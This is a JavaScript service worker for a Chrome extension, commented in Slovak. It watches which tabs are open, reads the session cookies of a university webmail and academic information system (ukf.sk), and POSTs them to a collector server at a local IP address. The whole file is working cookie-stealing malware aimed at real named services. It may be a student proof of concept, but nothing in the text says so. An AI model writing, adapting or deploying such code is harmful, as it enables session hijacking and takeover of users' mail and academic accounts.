console.log("SERVICE WORKER STARTED");

// Adresa Node.js servera prijímajúceho zachytené cookies
const SERVER_URL = "http://192.168.0.129:3000/sessid";

// Definícia sledovaných aplikácií a ich relačných cookies
/**
 * TARGETS:
 * - webmail (type = simple) - jednoduchá cookie -> cookies.get
 * - AIS (type = java) - Java aplikácia -> cookies.getAll
 */
const TARGETS = [
  {
    url: "https://studentmail.ukf.sk",  
    cookieName: "roundcube_sessid",
    type: "simple"
  },
  {
    url: "https://ais2.ukf.sk",
    cookieName: "JSESSIONID",
    type: "java"
  }
];

// Získanie cookie podľa typu aplikácie

function readCookie(target) {
  console.log("Snazim sa precitat cookie:", target.cookieName);

  // Webmail využíva štandardnú cookie
  if (target.type === "simple") {
    chrome.cookies.get(
      {
        url: target.url,
        name: target.cookieName
      },
      (cookie) => {
        if (!cookie) {
          console.log(`[INFO] Cookie ${target.cookieName} SA NENASLO !`);
          return;
        }

        console.log(`[FOUND] ${target.cookieName}`, cookie.value);
        sendToServer(target.cookieName, cookie.value);
      }
    );
  }

  // AiS môže vytvárať viacero JSESSIONID cookies, preto sa prehľadávajú všetky cookies domény
  if (target.type === "java") {
    chrome.cookies.getAll(
      {
        domain: "ais2.ukf.sk"
      },
      (cookies) => {
        const jsession = cookies.find(c => c.name === "JSESSIONID");

        if (!jsession) {
          console.log("[INFO] JSESSIONID SA NENASLO na ais2.ukf.sk");
          return;
        }

        console.log("[FOUND] JSESSIONID", jsession.value);
        sendToServer("JSESSIONID", jsession.value);
      }
    );
  }
}

// Odoslanie získanej cookie na serverovú časť aplikácie
function sendToServer(cookieName, value) {
  console.log("Posielam na server:", SERVER_URL);

  fetch(SERVER_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      cookie: cookieName,
      value: value,
      timestamp: Date.now()
    })
  })
    .then(() => console.log(`[OK] Odoslane ${cookieName}`))
    .catch(err => console.error("[ERROR] Odosielanie zlyhalo:", err));
}

// Spracovanie aktuálne otvorenej karty
function handleTab(tab) {
  if (!tab || !tab.url) return;

  console.log("Aktualna tab URL:", tab.url);

  for (const target of TARGETS) {
    if (tab.url.startsWith(target.url)) {
      console.log("Zhoda tabu:", tab.url);
      readCookie(target);
    }
  }
}

// Reakcia na prepnutie medzi kartami
chrome.tabs.onActivated.addListener(info => {
  chrome.tabs.get(info.tabId, handleTab);
});

// Reakcia na načítanie alebo obnovenie stránky
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete") {
    handleTab(tab);
  }
});